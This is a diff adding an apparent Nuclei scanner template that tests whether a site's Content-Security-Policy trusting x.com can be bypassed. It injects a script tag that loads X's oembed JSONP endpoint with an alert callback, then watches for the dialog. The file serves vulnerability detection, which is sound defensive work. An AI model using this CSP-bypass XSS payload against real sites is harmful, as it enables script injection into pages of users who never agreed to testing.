@@ -1,0 +1,55 @@
+id: x-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - X API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,x-api,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "x.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: x_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://api.x.com/1/statuses/oembed.json?url=https:%2F%2Ftwitter.com%2FMartina%2Fstatus%2F867710263654580226&callback=alert&_=1496363308445"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "x_api_csp_xss == true"
+# digest: 4a0a004730450220327f2bc7c35141f8fb83a5010a6682f0c13d30c22455bb4291e1f9abf5cccd36022100874289c217c88a4e4f0c3894ca8f253d6be916276e0086e8d003e3593c82d949:922c64590222798bb761d5b6d8e72950
